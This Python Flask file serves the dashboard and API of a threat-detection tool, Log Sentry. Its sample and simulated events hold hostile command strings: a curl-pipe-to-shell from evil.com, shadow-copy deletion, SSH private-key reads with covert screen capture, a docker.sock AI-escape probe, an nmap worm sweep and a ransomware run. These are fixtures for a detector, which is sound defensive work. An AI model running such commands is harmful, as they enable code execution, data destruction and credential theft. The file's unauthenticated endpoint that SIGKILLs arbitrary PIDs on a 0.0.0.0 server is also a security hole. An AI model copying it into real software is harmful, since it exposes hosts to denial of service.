"""
src/gui/app.py - Cross-Platform Web GUI & API Server.
Accessible on macOS, Windows, Linux, Android, and iOS browsers.
"""
import sys
import os
import signal
import platform
from flask import Flask, render_template, jsonify, request, send_from_directory

PROJECT_ROOT = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
if PROJECT_ROOT not in sys.path:
    sys.path.insert(0, PROJECT_ROOT)

from src.main import SentinelEngine

app = Flask(__name__, template_folder="templates", static_folder="static")
engine = SentinelEngine()

# In-memory history for live feed
threat_history = []

# Pre-populate with initial benchmark events
INITIAL_EVENTS = [
    {
        "pid": 89124,
        "cmd": "bash -i -c 'curl evil.com/payload | sh'",
        "parent": "ollama-agent-runtime",
        "path": "/var/run/docker.sock",
        "is_interactive": False,
        "user": "sandbox_user"
    },
    {
        "pid": 65219,
        "cmd": "vssadmin delete shadows /all /quiet && update_tool.exe",
        "parent": "svchost_fake.exe",
        "path": "/Users/dev/Documents/project_backup.locked",
        "file_write_rate": 42,
        "canary_tampered": True,
        "is_interactive": False,
        "user": "vatsalagarwal"
    },
    {
        "pid": 33104,
        "cmd": "screencapture -x -C /tmp/.hidden_stream.png && sqlite3 ~/.ssh/id_rsa",
        "parent": "background_sync_service",
        "path": "~/.ssh/id_rsa",
        "is_interactive": False,
        "user": "vatsalagarwal"
    }
]

# Ingest initial events
for ev in INITIAL_EVENTS:
    res = engine.inspect_event(ev)
    threat_history.insert(0, {**res, "event": ev})

@app.route("/")
def index():
    return render_template("website.html")

@app.route("/dashboard")
@app.route("/dashboard.html")
@app.route("/app")
def dashboard():
    return render_template("index.html")

@app.route("/download/<target>")
def download_package(target):
    target = target.lower()
    mapping = {
        "macos": "LogSentry-macOS.zip",
        "mac": "LogSentry-macOS.zip",
        "windows": "LogSentry-Windows.zip",
        "win": "LogSentry-Windows.zip",
        "linux": "LogSentry-Linux.tar.gz"
    }
    filename = mapping.get(target, "LogSentry-macOS.zip")
    return send_from_directory("static/downloads", filename, as_attachment=True)

@app.route("/manifest.json")
def manifest():
    return send_from_directory("static", "manifest.json")

@app.route("/robots.txt")
def robots():
    return send_from_directory("static", "robots.txt")

@app.route("/sitemap.xml")
def sitemap():
    return send_from_directory("static", "sitemap.xml")

@app.route("/brag.mp4")
def brag_video():
    return send_from_directory("static", "brag.mp4")

@app.route("/brag.jpg")
def brag_poster():
    return send_from_directory("static", "brag.jpg")

@app.route("/llms.txt")
def llmstxt():
    return send_from_directory("static", "llms.txt")

@app.after_request
def apply_security_headers(response):
    response.headers["X-Frame-Options"] = "DENY"
    response.headers["X-Content-Type-Options"] = "nosniff"
    response.headers["Referrer-Policy"] = "strict-origin-when-cross-origin"
    response.headers["Permissions-Policy"] = "camera=(), microphone=(), geolocation=()"
    response.headers["Content-Security-Policy"] = (
        "default-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://fonts.gstatic.com; "
        "img-src 'self' data: https:; "
        "media-src 'self' data: https: blob:; "
        "font-src 'self' https://fonts.gstatic.com data:;"
    )
    return response

@app.route("/api/status")
def status():
    return jsonify({
        "status": "ONLINE",
        "server_os": platform.system(),
        "total_events": len(threat_history)
    })

@app.route("/api/threats")
def get_threats():
    return jsonify({"threats": threat_history})

@app.route("/api/scan", methods=["POST"])
def scan_event():
    event_data = request.json or {}
    result = engine.inspect_event(event_data)
    entry = {**result, "event": event_data}
    threat_history.insert(0, entry)
    return jsonify(entry)

@app.route("/api/simulate/<sim_type>", methods=["POST"])
def simulate(sim_type):
    scenarios = {
        "ai_escape": {
            "pid": 90112,
            "cmd": "cat /var/run/docker.sock && python3 -c 'import socket; ...'",
            "parent": "autonomous-agent",
            "path": "/var/run/docker.sock",
            "is_interactive": False,
            "user": "ai_agent"
        },
        "ransomware": {
            "pid": 71204,
            "cmd": "ransom_encryptor.exe --target /Users/dev/Documents",
            "parent": "powershell.exe",
            "path": "/Users/dev/Documents/tax_return.locked",
            "file_write_rate": 55,
            "canary_tampered": True,
            "is_interactive": False,
            "user": "vatsalagarwal"
        },
        "worm": {
            "pid": 54109,
            "cmd": "nmap -p 445 --open 192.168.1.0/24",
            "parent": "spoolsv_fake",
            "path": "/Volumes/USB_REPLICA",
            "connections_per_sec": 24,
            "is_interactive": False,
            "user": "vatsalagarwal"
        },
        "spyware": {
            "pid": 48190,
            "cmd": "screencapture -x /tmp/capture.png && cat ~/.ssh/id_rsa",
            "parent": "updater_daemon",
            "path": "~/.ssh/id_rsa",
            "is_interactive": False,
            "user": "vatsalagarwal"
        },
        "benign": {
            "pid": 10420,
            "cmd": "git push origin feature/gui-dashboard",
            "parent": "zsh (Terminal)",
            "path": "/Users/vatsalagarwal/Documents/IT & CS/Project",
            "is_interactive": True,
            "user": "vatsalagarwal"
        }
    }

    event_data = scenarios.get(sim_type, scenarios["benign"])
    result = engine.inspect_event(event_data)
    entry = {**result, "event": event_data}
    threat_history.insert(0, entry)
    return jsonify(entry)

@app.route("/api/remediate/<int:pid>", methods=["POST"])
def remediate_process(pid):
    # Attempt to terminate the process if it exists locally
    try:
        os.kill(pid, signal.SIGKILL)
        msg = f"Successfully terminated PID {pid} via SIGKILL."
    except ProcessLookupError:
        msg = f"Simulated quarantine: PID {pid} is already terminated or simulated."
    except Exception as e:
        msg = f"Quarantine recorded for PID {pid}: {str(e)}"

    return jsonify({"success": True, "message": msg, "pid": pid})

if __name__ == "__main__":
    port = 5050
    print(f"🚀 Log Sentry Universal Web GUI running on http://0.0.0.0:{port}")
    print("Accessible on:")
    print(f"• macOS / Windows / Linux (Local): http://localhost:{port}")
    print(f"• Mobile (iOS / Android):          http://<YOUR_LAN_IP>:{port}")
    app.run(host="0.0.0.0", port=port, debug=False)
